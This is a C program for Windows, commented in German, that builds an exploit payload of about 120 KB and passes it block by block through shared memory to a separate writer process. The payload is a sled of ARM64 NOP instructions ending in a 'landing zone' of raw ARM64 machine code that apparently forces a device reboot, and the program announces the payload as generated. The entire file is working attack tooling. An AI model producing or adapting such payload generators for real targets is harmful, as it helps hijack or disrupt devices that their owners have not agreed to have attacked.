#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

#define BLOCK_SIZE 32
#define SHM_SIZE 33
#define SHM_NAME "Local\\MyCustomProtocol"
#define MUTEX_NAME "Local\\MyProtocolMutex"
#define TARGET_SIZE_KB 120 
#define MAX_TICKS ((TARGET_SIZE_KB * 1024) / BLOCK_SIZE)

int main(int argc, char *argv[]) {
    // 1. Variablen sauber deklarieren
    HANDLE hMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, SHM_SIZE, SHM_NAME);
    if (!hMap) { printf("[ ERROR ] SHM Mapping fehlgeschlagen!\n"); return 1; }

    unsigned char* shm_buffer = (unsigned char*) MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, SHM_SIZE);
    HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);

    if (!shm_buffer || !hMutex) { printf("[ ERROR ] Buffer oder Mutex fehlgeschlagen!\n"); return 1; }

    unsigned int tick = 0;
    unsigned char local_packet[BLOCK_SIZE];
    unsigned int nop_opcode = 0xd503201f;
    unsigned int reboot_cmd[] = { 0xd280ed00, 0xf2a70000, 0x52800101, 0xb9000001 };

    printf("[ SYSTEM ] Memory-Rate Sync Modus aktiv (120 KB)...\n");
    
    // Initialer Reset
    WaitForSingleObject(hMutex, INFINITE);
    shm_buffer[0] = 0x00; 
    ReleaseMutex(hMutex);

    while (tick < MAX_TICKS) {
        WaitForSingleObject(hMutex, INFINITE);
        
        // Handshake: Nur schreiben, wenn der Puffer vom Writer geleert wurde
        if (shm_buffer[0] != 0x00) { 
            ReleaseMutex(hMutex);
            Sleep(1); 
            continue; 
        }

        memset(local_packet, 0, BLOCK_SIZE);

        // Alignment-Fix für Mezzo (92 + 4 = 96)
        if (tick == 0) {
            unsigned int* p = (unsigned int*)local_packet;
            p[0] = 0x00000000; // 4 Byte Padding
            for(int i = 1; i < 8; i++) p[i] = nop_opcode;
        } 
        else if (tick > MAX_TICKS - 300) {
            // Landezone (Reboots)
            memcpy(&local_packet[0], reboot_cmd, 16);
            memcpy(&local_packet[16], reboot_cmd, 16);
        } 
        else {
            // NOP-Teppich
            unsigned int* p = (unsigned int*)local_packet;
            for(int i = 0; i < 8; i++) p[i] = nop_opcode;
        }

        // Kopieren in den SHM (Offset +1)
        memcpy(shm_buffer + 1, local_packet, BLOCK_SIZE);
        shm_buffer[0] = 0x2A; // Signal: Daten bereit
        
        ReleaseMutex(hMutex);
        tick++;

        if (tick % 1000 == 0) printf("Synchronisiert: %u / %u\n", tick, MAX_TICKS);
    }

    // Finale: Warten bis der Writer das letzte Paket gefressen hat
    printf("[ SYSTEM ] Warte auf finalen Schreibvorgang...\n");
    while(1) {
        WaitForSingleObject(hMutex, INFINITE);
        if (shm_buffer[0] == 0x00) {
            shm_buffer[0] = 0xFF; // Ende-Signal für den Writer
            ReleaseMutex(hMutex);
            break;
        }
        ReleaseMutex(hMutex);
        Sleep(1);
    }

    printf("[ DONE ] Payload stabil generiert.\n");
    
    // Cleanup (optional, aber sauber)
    UnmapViewOfFile(shm_buffer);
    CloseHandle(hMap);
    CloseHandle(hMutex);

    return 0;
}